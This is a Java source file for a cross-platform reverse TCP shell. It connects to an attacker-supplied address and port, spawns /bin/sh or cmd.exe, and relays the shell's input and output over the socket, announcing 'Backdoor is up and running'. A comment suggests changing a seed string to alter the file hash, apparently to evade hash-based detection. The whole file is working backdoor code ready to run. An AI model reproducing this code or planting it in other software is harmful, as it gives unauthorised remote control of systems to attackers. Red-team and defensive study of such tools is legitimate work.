// Copyright (c) 2021 Ivan Šincek
// Requires Java SE v8 or greater and JDK v8 or greater.
// Works on Linux OS, macOS, and Windows OS.
package reverse.shell;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.util.Arrays;

public class ReverseShell {
    
    // NOTE: Change seed to help you change the file hash.
    private String            seed   = "3301Kira";
    private InetSocketAddress addr   = null;
    private String            os     = null;
    private String            shell  = null;
    private byte[]            buffer = null;
    private int               clen   = 0;
    private boolean           error  = false;
    
    public ReverseShell(String addr, int port) {
        this.addr = new InetSocketAddress(addr, port);
    }
    
    private boolean detect() {
        boolean detected = true;
        this.os = System.getProperty("os.name").toUpperCase();
        if (this.os.contains("LINUX") || this.os.contains("MAC")) {
            this.os    = "LINUX";
            this.shell = "/bin/sh";
        } else if (this.os.contains("WIN")) {
            this.os    = "WINDOWS";
            this.shell = "cmd.exe";
        } else {
            detected   = false;
            System.out.print("SYS_ERROR: Underlying operating system is not supported, program will now exit...\n");
        }
        return detected;
    }
    
    // strings in Java are immutable, so we need to avoid using them to minimize the data in memory
    private void brw(InputStream input, OutputStream output, String iname, String oname) {
        int bytes = 0;
        try {
            do {
                if (this.os.equals("WINDOWS") && iname.equals("STDOUT") && this.clen > 0) {
                    // for some reason Windows OS pipes STDIN into STDOUT
                    // we do not like that
                    // we need to discard the data from the stream
                    do {
                        bytes = input.read(this.buffer, 0, this.clen >= this.buffer.length ? this.buffer.length : this.clen);
                        this.clen -= this.clen >= this.buffer.length ? this.buffer.length : this.clen;
                    } while (bytes > 0 && this.clen > 0);
                } else {
                    bytes = input.read(this.buffer, 0, this.buffer.length);
                    if (bytes > 0) {
                        output.write(this.buffer, 0, bytes);
                        output.flush();
                        if (this.os.equals("WINDOWS") && oname.equals("STDIN")) {
                            this.clen += bytes;
                        }
                    } else if (iname.equals("SOCKET")) {
                        this.error = true;
                        System.out.print("SOC_ERROR: Shell connection has been terminated\n\n");
                    }
                }
            } while (input.available() > 0);
        } catch (SocketTimeoutException ex) {} catch (IOException ex) {
            this.error = true;
            System.out.print(String.format("STRM_ERROR: Cannot read from %s or write to %s, program will now exit...\n\n", iname, oname));
        }
    }
    
    public void run() {
        if (this.detect()) {
            Socket       client  = null;
            OutputStream socin   = null;
            InputStream  socout  = null;
            
            Process      process = null;
            OutputStream stdin   = null;
            InputStream  stdout  = null;
            InputStream  stderr  = null;
            
            try {
                client = new Socket();
                client.setSoTimeout(100);
                client.connect(this.addr);
                socin  = client.getOutputStream();
                socout = client.getInputStream();
                
                this.buffer = new byte[1024];
                
                process = new ProcessBuilder(this.shell).redirectInput(ProcessBuilder.Redirect.PIPE).redirectOutput(ProcessBuilder.Redirect.PIPE).redirectError(ProcessBuilder.Redirect.PIPE).start();
                stdin   = process.getOutputStream();
                stdout  = process.getInputStream();
                stderr  = process.getErrorStream();
                
                System.out.print("Backdoor is up and running...\n\n");
                do {
                    if (!process.isAlive()) {
                        System.out.print("PROC_ERROR: Shell process has been terminated\n\n"); break;
                    }
                    this.brw(socout, stdin, "SOCKET", "STDIN");
                    if (stderr.available() > 0) { this.brw(stderr, socin, "STDERR", "SOCKET"); }
                    if (stdout.available() > 0) { this.brw(stdout, socin, "STDOUT", "SOCKET"); }
                } while (!this.error);
                System.out.print("Backdoor will now exit...\n");
            } catch (IOException ex) {
                System.out.print(String.format("ERROR: %s\n", ex.getMessage()));
            } finally {
                if (stdin   != null) { try { stdin.close() ; } catch (IOException ex) {} }
                if (stdout  != null) { try { stdout.close(); } catch (IOException ex) {} }
                if (stderr  != null) { try { stderr.close(); } catch (IOException ex) {} }
                if (process != null) { process.destroy(); }
                
                if (socin  != null) { try { socin.close() ; } catch (IOException ex) {} }
                if (socout != null) { try { socout.close(); } catch (IOException ex) {} }
                if (client != null) { try { client.close(); } catch (IOException ex) {} }
                
                if (this.buffer != null) { Arrays.fill(this.buffer, (byte)0); }
            }
        }
    }
    
    public static void main(String[] args) {
        System.out.print("Java Reverse TCP v3.0 by Ivan Sincek.\n");
        System.out.print("GitHub repository at github.com/ivan-sincek/java-reverse-tcp.\n");
        if (args.length != 2) {
            System.out.print("Usage: java -jar Reverse_Shell.jar <addr> <port>\n");
        } else {
            boolean error = false;
            args[0] = args[0].trim();
            if (args[0].length() < 1) {
                error = true;
                System.out.print("Address is required\n");
            }
            int port = -1;
            args[1] = args[1].trim();
            if (args[1].length() < 1) {
                error = true;
                System.out.print("Port number is required\n");
            } else {
                try {
                    port = Integer.parseInt(args[1]);
                    if (port < 0 || port > 65535) {
                        error = true;
                        System.out.print("Port number is out of range\n");
                    }
                } catch (NumberFormatException ex) {
                    error = true;
                    System.out.print("Port number is not valid\n");
                }
            }
            if (!error) {
                ReverseShell sh = new ReverseShell(args[0], port);
                sh.run();
                sh = null;
                System.gc();
            }
        }
    }
    
}
